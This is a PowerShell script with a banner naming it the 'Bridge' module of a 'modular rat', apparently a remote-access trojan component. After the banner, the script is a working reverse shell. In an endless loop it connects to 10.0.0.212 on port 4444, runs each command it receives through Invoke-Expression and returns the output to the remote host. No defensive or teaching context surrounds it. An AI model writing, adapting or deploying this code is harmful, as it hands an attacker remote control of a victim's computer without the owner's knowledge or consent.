function title {
    Write-Host "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" -ForegroundColor Yellow
    Write-Host "
     _ __ ___   ___   __| |_   _| | __ _ _ __   _ __ __ _| |_
    | '_ ` _ \ / _ \ / _` | | | | |/ _` | '__| | '__/ _` | __|
    | | | | | | (_) | (_| | |_| | | (_| | |    | | | (_| | |_
    |_| |_| |_|\___/ \__,_|\__,_|_|\__,_|_|    |_|  \__,_|\__|
    " -ForegroundColor Yellow
    Write-Host "
                        Module : Bridge
    " -ForegroundColor Blue
    Write-Host "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" -ForegroundColor Yellow
    Write-Host ""
}

function run() {
    title
    while ($true) {
        try {
            $server = "10.0.0.212"
            $client = New-Object System.Net.Sockets.TCPClient($server, 4444)
            $stream = $client.GetStream() 
            [byte[]]$bytes = 0..65535 | ForEach-Object { 0 }; 
            
            while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
                $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
                $sendback = (Invoke-Expression $data 2>&1);
                $sendback += "`nPS " + (Get-Location).Path + '> ';
                $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);
                $stream.Write($sendbyte, 0, $sendbyte.Length);
                $stream.Flush();
            };
        }
        catch {
            Write-Host "Could not establish connection..." -ForegroundColor Red
        }
        Write-Host "Connection established...:)" -ForegroundColor Green
    }
}

run
